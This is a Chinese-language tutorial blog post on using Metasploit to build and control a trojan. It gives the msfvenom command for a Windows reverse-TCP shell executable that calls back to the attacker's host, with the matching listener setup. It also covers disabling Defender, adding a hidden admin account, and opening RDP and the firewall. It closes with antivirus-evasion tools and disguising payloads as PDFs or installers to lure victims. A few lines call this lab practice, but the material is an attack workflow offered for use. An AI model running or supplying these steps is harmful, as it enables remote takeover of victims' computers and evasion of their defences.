---
title: MSF 木马病毒
date: 2025-07-09
category: Note
tags: 
    - MSF
    - 网络安全
description: 
outline: [2,3]
draft: false
sticky: false
cbf: false
zoomable: true
publish: true
AutoAnchor: false
aside: false
noSearch: false 
---

# MSF 木马病毒

[[toc]]

Metasploit Framework 是一款开源的安全漏洞检测工具，可以用于信息收集、漏洞探测、漏洞利用等渗透测试的全流程。

**漏洞**：在软件、系统或网络中存在的安全弱点或错误，可以被攻击者利用来获取未授权的访问、破坏数据、执行恶意代码等。漏洞可能是由设计缺陷、编程错误、配置不当或其他原因引起的。

- **IP：** *Internet Protocol*（互联网协议）的缩写，它是计算机网络中用于标识和定位设备（例如电脑、服务器、路由器等）的一种数字地址。IP 地址是唯一的，类似于房屋地址，用于在网络上准确定位和寻找设备。
  - **内网IP**：在局域网或私有网络中使用的IP地址；
  - **外网IP**：在公共互联网中使用的全局IP地址；
- **PORT：** 端口用于标识和区分不同应用程序或服务的数字标识符。通过 IP 地址来定位设备后，再通过端口号来定位设备上特定的应用程序或服务。
- **POC：** *Proof of Concept* 验证，指验证是否存在漏洞。
- **EXP：** *Exploit* 利用，指利用漏洞发起攻击。
- **Payload：** 有效载荷，指 exploit（攻击）成功以后，**真正**在目标系统软件中实施的**编码或命令**。

metasploit-framework 仓库：https://github.com/rapid7/metasploit-framework

官方网站下载：https://www.metasploit.com/download

安装成功后，在安装的目的找到 bin 目录，在 bin 目录启动CMD，

##### 制作木马

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=[攻击机IP] LPORT=[攻击机端口] -f exe -o shell.exe
```

##### 监听木马

```bash
msfconsole

use exploit/multi/handler

set payload windows/x64/shell/reverse_tcp

set lhost 0.0.0.0

set lport [攻击机端口]

run
```

##### 发送木马到受害者电脑并且进行管理员方式运行

如果运行不了，可以运行命令进行临死关闭 Defender 实时保护

```bash
# 临时关闭 Defender 实时保护（管理员运行）
Set-MpPreference -DisableRealtimeMonitoring $true
```

**不建议**永久关闭 Defender，因为它可能会导致系统无法正常恢复或被其他恶意程序感染。

###  基础命令与作用

| 命令                | 说明                                                         |
| ------------------- | ------------------------------------------------------------ |
| `chcp 65001`        | 将字符编码切换为 UTF-8，解决命令行中中文乱码问题             |
| `systeminfo`        | 查看操作系统详细信息（如安装日期、补丁、热修复、物理内存等） |
| `ver`               | 查看 Windows 系统版本                                        |
| `whoami`            | 查看当前用户                                                 |
| `ipconfig`          | 显示本机网络信息（IP、网关、子网掩码等）                     |
| `ping`              | 测试网络连通性（如 `ping 8.8.8.8`）                          |
| `dir`               | 列出当前目录下的文件和文件夹                                 |
| `cd`                | 进入指定目录（如 `cd C:\Windows`）                           |
| `shutdown -s -t 10` | 10 秒后关机，可用于测试远程命令执行能力                      |

**用户管理相关命令**（靶场测试专用）

| 命令                                      | 说明                                     |
| ----------------------------------------- | ---------------------------------------- |
| `net user hack 123qwe@#$ /add`            | 添加一个名为 `hack` 的用户，密码为 `123` |
| `net user hack /del`                      | 删除用户 `hack`                          |
| `net localgroup administrators hack /add` | 将 `hack` 用户添加到管理员组（提权）     |

场景案例：开启远程桌面 + 防火墙配置（靶场练习）

**启用远程桌面服务**：

```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

**配置防火墙开放 3389 端口（默认远程桌面端口）：**

```bash
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

### 使用工具对 Payload 进行免杀处理

Metasploit 默认生成的是裸 payload，非常容易被杀掉。我们要“包一层”进行混淆或加壳：

推荐的免杀工具（适用于虚拟机靶场）

| 工具               | 功能                         | 开源地址                                     |
| ------------------ | ---------------------------- | -------------------------------------------- |
| **Shellter**       | 动态注入、加壳，生成免杀 EXE | https://github.com/shellter-project/shellter |
| **Veil-Framework** | 自动生成加壳的免杀木马       | https://github.com/Veil-Framework/Veil       |

### 常见的木马渗透三步法流程（APT、小型 RAT、钓鱼攻击等）

| 阶段            | 动作                                           | 说明                                      |
| --------------- | ---------------------------------------------- | ----------------------------------------- |
| **1. 木马生成** | 使用 Metasploit、Cobalt Strike 等生成 payload  | 一般是反弹 shell 或 meterpreter、远控模块 |
| **2. 免杀处理** | 加壳、混淆、加密、编译为 DLL、Shellcode Loader | 绕过杀毒、防火墙、EDR 检测                |
| **3. 伪装诱导** | 包装成 PDF、EXE 安装器、游戏、工具等诱导点击   | 伪装文件图标、加捆绑安装器、诱导执行      |